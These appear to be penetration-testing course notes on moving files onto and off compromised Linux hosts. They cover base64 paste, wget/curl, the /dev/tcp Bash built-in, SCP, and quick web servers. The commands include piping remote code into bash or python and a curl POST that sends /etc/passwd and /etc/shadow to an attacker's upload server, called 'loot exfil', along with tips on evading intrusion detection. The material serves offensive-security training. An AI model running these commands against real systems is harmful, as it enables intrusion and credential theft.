# NOTES — Linux File Transfer Methods

## ID
617

## Module
File Transfers

## Kind
notes

## Title
Section 3 — Linux File Transfer Methods

## Description
Native Linux transfer techniques — base64 paste, wget/curl, fileless pipes, the /dev/tcp Bash built-in when no tools exist, SCP, and Python/PHP/Ruby web servers for catching uploads.

## Tags
linux, wget, curl, bash, dev-tcp, scp, ssh, base64, python-http-server, uploadserver

## Commands
- `md5sum id_rsa`
- `cat id_rsa | base64 -w 0; echo`
- `echo -n '<b64>' | base64 -d > id_rsa`
- `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`
- `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
- `curl <url> | bash`
- `wget -qO- <url> | python3`
- `exec 3<>/dev/tcp/<ip>/80`
- `echo -e "GET /file HTTP/1.1\n\n" >&3`
- `cat <&3`
- `sudo systemctl enable ssh && sudo systemctl start ssh`
- `scp user@<ip>:/remote/path .`
- `sudo python3 -m pip install --user uploadserver`
- `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
- `sudo python3 -m uploadserver 443 --server-certificate ~/server.pem`
- `curl -X POST https://<ip>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`
- `python3 -m http.server`
- `python2.7 -m SimpleHTTPServer`
- `php -S 0.0.0.0:8000`
- `ruby -run -ehttpd . -p8000`

## What This Section Covers
Linux has many built-in / pre-installed paths for transfers. HTTP is the dominant channel for both attackers and modern malware. This section also covers the `/dev/tcp` Bash built-in for environments where no transfer tools exist at all.

## Methodology — Download

### A. Base64 paste
1. Attacker: `md5sum id_rsa` then `cat id_rsa | base64 -w 0; echo`.
2. Target: `echo -n '<b64>' | base64 -d > id_rsa`
3. Verify: `md5sum id_rsa`.

### B. wget / curl
- `wget <url> -O <out>` (capital `-O`).
- `curl -o <out> <url>` (lowercase `-o`).

### C. Fileless via pipe
- Shell scripts: `curl <url> | bash`
- Python: `wget -qO- <url> | python3`

> Some payloads (like `mkfifo`) write temp files even when "fileless" — the **execution** is fileless, but the OS may still flush something to disk.

### D. `/dev/tcp` Bash built-in (no curl/wget needed)
Requires Bash 2.04+ compiled with `--enable-net-redirections`.
```
exec 3<>/dev/tcp/<ip>/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
cat <&3
```
This raw HTTP exchange writes through file descriptor 3 — minimal footprint.

### E. SCP
1. Attacker: enable SSH — `sudo systemctl enable ssh && sudo systemctl start ssh`.
2. Confirm listener: `netstat -lnpt` (look for `:22 LISTEN`).
3. Target: `scp user@<attacker-ip>:/root/myroot.txt .`

> Use a **temp user** for SCP transfers — don't reuse your real attacker creds/keys on a compromised host.

## Methodology — Upload

### A. uploadserver over HTTPS (recommended)
1. `sudo python3 -m pip install --user uploadserver`
2. Generate self-signed cert: `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
3. **Don't** serve from same dir as the cert — `mkdir https && cd https`.
4. `sudo python3 -m uploadserver 443 --server-certificate ~/server.pem`
5. Target: `curl -X POST https://<ip>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`

### B. Mini web servers (pull from target via attacker-side curl/wget)
If the compromised box already runs a web server, drop the file in the webroot and pull it. Otherwise spin up a quick one:

| Stack | One-liner |
|-------|-----------|
| Python 3 | `python3 -m http.server` (port 8000) |
| Python 2.7 | `python2.7 -m SimpleHTTPServer` |
| PHP | `php -S 0.0.0.0:8000` |
| Ruby | `ruby -run -ehttpd . -p8000` |

Then on the **attacker host** (the one that wants the file): `wget <target-ip>:8000/file`. Note the direction — this is *attacker pulling from target*, not uploading.

### C. SCP Upload
`scp /etc/passwd user@<target-ip>:/home/user/`

## Direction Reference

| Goal | Best Linux method |
|------|-------------------|
| Tiny secret (key, config) | Base64 paste |
| Tooling drop, HTTP egress allowed | `wget`/`curl` from your HTTPS server |
| Fileless script run | `curl <url> \| bash` or `wget -qO- <url> \| python3` |
| No curl/wget on target | `/dev/tcp` exec descriptor |
| Loot exfil over HTTPS | `curl -X POST … -F` to `uploadserver` |
| SSH allowed outbound | `scp` from compromised host |

## Lab — Questions & Answers
Source content does not include lab question text or answers (only point values shown). Practice on the spawned NIX target.

## Key Takeaways
- The **direction confusion** trap: a "Python web server" started on the attacker is for the *target* to download from. A Python web server on the *target* lets the attacker `wget` to pull files off — that's still "exfil" but uses inbound from attacker's POV.
- `/dev/tcp` is the ultimate "nothing installed" fallback — it's a Bash feature, not a separate binary.
- HTTPS is worth the cert hassle when exfilling sensitive data — defenders' IDS sees plaintext usernames/hashes otherwise.

## Gotchas
- `wget -qO-` uses **capital O** with hyphen for stdout. `wget -qo-` (lowercase) is a different (log) flag — easy mistake.
- `curl --insecure` (or `-k`) is required for self-signed HTTPS — without it, curl refuses.
- Some minimal containers don't even ship Bash — `/dev/tcp` won't work in dash/ash.
- `python -m SimpleHTTPServer` only exists on Python 2 — `python3 -m http.server` for Python 3.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|file-transfers]]
← [[02-windows-file-transfer-methods]] | [[04-transferring-files-with-code]] →
<!-- AUTO-LINKS-END -->
